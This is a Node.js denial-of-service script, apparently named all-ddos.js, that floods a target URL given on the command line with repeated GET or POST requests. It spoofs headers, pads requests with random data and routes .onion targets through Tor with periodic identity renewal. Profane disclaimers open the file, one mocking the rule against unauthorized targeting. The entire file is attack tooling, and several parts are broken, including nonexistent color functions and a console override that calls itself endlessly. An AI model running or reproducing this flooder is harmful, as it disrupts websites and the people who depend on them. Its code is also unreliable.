// WARNING: THIS TOOL IS FOR FUCKING EXPERIMENTAL AND EDUCATIONAL PURPOSES ONLY.
 // MISUSE CAN RESULT IN SEVERE LEGAL CONSEQUENCES. USE AT YOUR OWN RISK, YOU FUCKING MORON.
 // THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL. BIGMANCOZMO IS NOT RESPONSIBLE. FUCK IT UP, I DARE YOU.
 

 // DISCLAIMER: THIS TOOL IS CAPABLE OF CAUSING SIGNIFICANT DISRUPTION.
 // IT SHOULD NOT BE USED AGAINST SITES WITHOUT EXPLICIT PERMISSION.
 // TARGETING SITES WITHOUT AUTHORIZATION IS ILLEGAL, UNLESS YOU ARE ME, MOTHERFUCKER.
 

 const chalk = require('chalk'); // For colored console output (install using npm install chalk)
 const ddosLog = require('fs').createWriteStream('ddos_log.txt', { flags: 'a' }); // Logging to a file (requires 'fs' module)
 const crypto = require('crypto'); // for generating random shit
 const http = require('http'); // basic http
 const https = require('https'); // secure!
 const { URL } = require('url'); // For robust URL parsing
 const dns = require('dns').promises; // Async DNS resolution
 const { SocksProxyAgent } = require('socks-proxy-agent'); // Import SocksProxyAgent
 const { exec } = require('child_process'); // For running external commands (like Tor's renewidentity)
 

 const targetURL = process.argv[2]; // Get target URL from command line
 const threads = process.argv[3] || 10; // Number of threads (default 10)
 const onion = targetURL.includes('.onion'); // Is it a dark web site?
 const torProxy = 'socks5h://127.0.0.1:9050'; // Default Tor proxy, adjust if needed
 const maxRequestsPerMinute = process.argv[4] || 5000; // Limit requests per minute
 const attackDuration = process.argv[5] || 60; // Attack duration in seconds (default 60)
 const torIdentityInterval = process.argv[6] || 30; // Tor identity renewal interval in seconds
 const advancedMode = process.argv[7] || false; // Enable advanced features
 

 if (!targetURL) {
  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration] [torIdentityInterval] [advancedMode]"));
  process.exit(1);
 }
 

 // Validate the target URL
 try {
  new URL(targetURL); // Will throw an error if the URL is invalid
 } catch (error) {
  console.log(chalk.red.bold(`Invalid URL: ${targetURL}. This shit has to be a valid URL, you dumb fuck.`));
  process.exit(1);
 }
 

 console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Cranking it to ${maxRequestsPerMinute} requests per minute. Tor identity will renew every ${torIdentityInterval} seconds. Prepare for some fucking chaos. Press Ctrl+C to stop.`));
 

 let requestCount = 0; // Initialize the request counter
 let lastMinuteStart = Date.now(); // Initialize the start time of the last minute
 let startTime = Date.now();
 

 function logAction(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
 

  ddosLog.write(logMessage, (err) => {
  if (err) console.error(chalk.red(`Fucking error writing to log file: ${err}`));
  });
 

  console.log(chalk.blue(logMessage.trim())); // Also output to console
 }
 

 function getRandomString(length) {
  return crypto.randomBytes(length).toString('hex');
 }
 

 async function resolveDNS(hostname) {
  try {
  const addresses = await dns.resolve(hostname);
  return addresses;
  } catch (error) {
  logAction(chalk.red(`DNS resolution failed for ${hostname}: ${error.message}`));
  return null;
  }
 }
 

 // Advanced features
 function generateRandomData(sizeInBytes) {
  return crypto.randomBytes(sizeInBytes).toString('hex');
 }
 

 async function attack() {
  const urlObject = new URL(targetURL);
  const hostname = urlObject.hostname;
 

  const ipAddresses = await resolveDNS(hostname);
  if (!ipAddresses || ipAddresses.length === 0) {
  return;
  }
  const options = {
  url: targetURL,
  method: 'GET',
  headers: {
  'User-Agent': getRandomString(32), // Spoof user agent
  'Cache-Control': 'no-cache',
  'Accept-Encoding': 'gzip, deflate, br',
  'Connection': 'keep-alive',
  'Fuck-You': getRandomString(64), // Add some random headers
  'X-Forwarded-For': ipAddresses[Math.floor(Math.random() * ipAddresses.length)] // Spoof IP
  },
  };
 

  const protocol = targetURL.startsWith('https') ? https : http; // Choose http or https
 

  if (onion) {
  options.agent = new SocksProxyAgent({ protocol: 'socks5h:', host: '127.0.0.1', port: 9050 }); // use tor proxy on .onion
  }
 

  // Throttling mechanism
  const now = Date.now();
  if (now - lastMinuteStart > 60000) {
  requestCount = 0; // Reset the counter if a minute has passed
  lastMinuteStart = now;
  }
 

  if (requestCount < maxRequestsPerMinute) {
  requestCount++;
 

  // Advanced mode: Add random data and POST requests
  if (advancedMode) {
  options.method = 'POST';
  const randomDataSize = Math.floor(Math.random() * 1024); // Up to 1KB of random data
  const postData = generateRandomData(randomDataSize);
  options.headers['Content-Length'] = postData.length;
  options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
  options.body = postData;
 

  const req = protocol.request(options, (res) => {
  logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
  res.on('data', () => {
  //Consume the fucking data
  });
  res.on('end', () => {
  //fuck, end of data
  });
  }).on('error', (err) => {
  logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
  });
  req.write(postData);
  req.end();
  } else {
  protocol.get(options, (res) => {
  logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
  res.on('data', () => {
  //Consume the fucking data
  });
  res.on('end', () => {
  //fuck, end of data
  });
 

  }).on('error', (err) => {
  logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
  });
  }
  } else {
  // if request limit is reached
  logAction(chalk.yellow("Request limit reached. Throttling this shit."));
  }
 }
 

 function flood() {
  for (let i = 0; i < threads; i++) {
  attack();
  }
 }
 

 function renewTorIdentity() {
  exec('sudo /usr/sbin/service tor reload', (error, stdout, stderr) => {
  if (error) {
  logAction(chalk.red(`Failed to renew Tor identity: ${error.message}`));
  return;
  }
  logAction(chalk.purple('Tor identity renewed, hopefully those bastards are still dealing with my shit.'));
  });
 }
 

 setInterval(flood, 5); // Adjust timing to your fucking liking, but go fuckin' nuts
 

 // Renew Tor identity at intervals
 if (onion) {
  setInterval(renewTorIdentity, torIdentityInterval * 1000);
 }
 

 // Stop the attack after a specified duration
 setTimeout(() => {
  console.log(chalk.purple.bold("\nStopping DDoS attack after specified duration."));
  ddosLog.end(() => {
  console.log(chalk.dark_blue("DDoS log file closed."));
  process.exit();
  });
 }, attackDuration * 1000);
 

 process.on('SIGINT', () => {
  console.log(chalk.purple.bold("\nStopping DDoS attack."));
  ddosLog.end(() => {
  console.log(chalk.dark_blue("DDoS log file closed."));
  process.exit();
  });
 });
 

 // Apply color scheme using chalk
 console.log = (message) => {
  console.log(chalk.keyword('darkgreen')(message));
 };
 console.error = (message) => {
  console.error(chalk.keyword('darkred')(message));
 };
 console.warn = (message) => {
  console.warn(chalk.keyword('purple')(message));
 };